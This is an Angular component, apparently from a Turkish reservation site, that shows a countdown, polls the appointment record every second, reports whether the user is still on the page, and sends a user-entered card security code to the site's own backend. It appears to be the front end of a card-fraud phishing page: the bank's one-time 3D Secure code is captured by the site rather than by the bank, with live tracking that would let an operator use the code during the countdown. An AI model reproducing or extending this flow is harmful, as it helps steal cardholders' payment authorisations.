import { Component,HostListener, OnDestroy, OnInit } from '@angular/core';
import { NavigationEnd, Router } from '@angular/router';
import { ApiService } from '../customService/api.service';
import { Subscription, interval, switchMap, timer } from 'rxjs';
import { AlertifyService } from '../customService/alertify.service';
import { FormBuilder, FormGroup, Validators } from '@angular/forms';
import { SessionService } from '../customService/session.service';

@Component({
  selector: 'app-cardsecure',
  templateUrl: './cardsecure.component.html',
  styleUrls: ['./cardsecure.component.css']
})
export class CardsecureComponent implements OnInit, OnDestroy{
  constructor(
    private router: Router,
    private apiService: ApiService,
    private alertify: AlertifyService,
    private formBuilder: FormBuilder,
    private sessionService: SessionService
  ){}

  counter: number = 180; // Dakika cinsinden süre
  minutes: number = 0;
  seconds: number = 0;
  currentDateTime: string = "";
  price: any = 0
  isPageVisible: boolean = false;
  errorMessage: any
  appoinmentId: number = 0
  liveAppointmentData: any
  subscription!: Subscription
  secureForm!: FormGroup


  async ngOnInit() {
    this.createSecureForm()
    //this.appoinmentId = history.state.payment.appoinment.formData.house

    this.appoinmentId = this.sessionService.getSettionData('appoinmentId')
    const control = history.state.payment
    
    if(!this.appoinmentId && !control){
      this.router.navigate(['rezervasyon'])
    }else{
      this.timer()
      this.getCurrentDateTime();
      this.price = history.state.payment.totalPrice

      // Data
      this.subscription = timer(0,1000).pipe(
        switchMap(() => this.apiService.getByIdAppoinment(this.appoinmentId))
      ).subscribe((data:any) => {
        this.liveAppointmentData = data
        // Payment Success
        // if (this.liveAppointmentData.data.secure.status){
        //   this.alertify.success('Ödeme işlemi başarılı.')
        //   this.router.navigate(['rezervasyon'])
        // }
      })
    }
  }

  ngOnDestroy() {
    this.sessionService.removeSession('appoinmentId')
    if (this.subscription) {
      this.subscription.unsubscribe();
    }

    this.saveUserActivityToDatabase()
  }

  timer() {
    setTimeout(() => {
      this.counter--;
  
      if (this.counter > 0) {
        this.calculateTime();
        this.timer();
      } else {
        
        this.router.navigate(['rezervasyon'])
      }
    }, 1000); // Her bir saniye için
  }
  
  calculateTime() {
    this.minutes = Math.floor(this.counter / 60);
    this.seconds = this.counter % 60;
  }

  getCurrentDateTime() {
    const currentDate: Date = new Date();
    this.currentDateTime = currentDate.toLocaleString();
  }

  saveUserActivityToDatabase() {
    // Get Appoinment ID
    this.apiService.secureUpdate({isPage: false}, this.appoinmentId)
  }

  @HostListener('window:beforeunload', ['$event'])
  beforeUnloadHandler(event: Event) {
    // Kullanıcının sayfadan ayrıldığında yapılacak işlemleri burada gerçekleştirin
    // Örneğin, veritabanına kaydetmek için bir HTTP isteği gönderin
    this.saveUserActivityToDatabase();
  }

  

  createSecureForm(){
    this.secureForm = this.formBuilder.group({
      code:["", Validators.required]
    })
  }

  secureCodeControl(){
    try{

      if(this.secureForm.valid){
        // Get Validation Code
        const formData = Object.assign({}, this.secureForm.value)
        const code = formData.code
        this.apiService.secureUpdate({code: code}, this.appoinmentId)
        this.secureForm.reset()
      }

    }catch(err){
      this.alertify.danger('Güvenlik kodu yanlış.')
    }
  }

}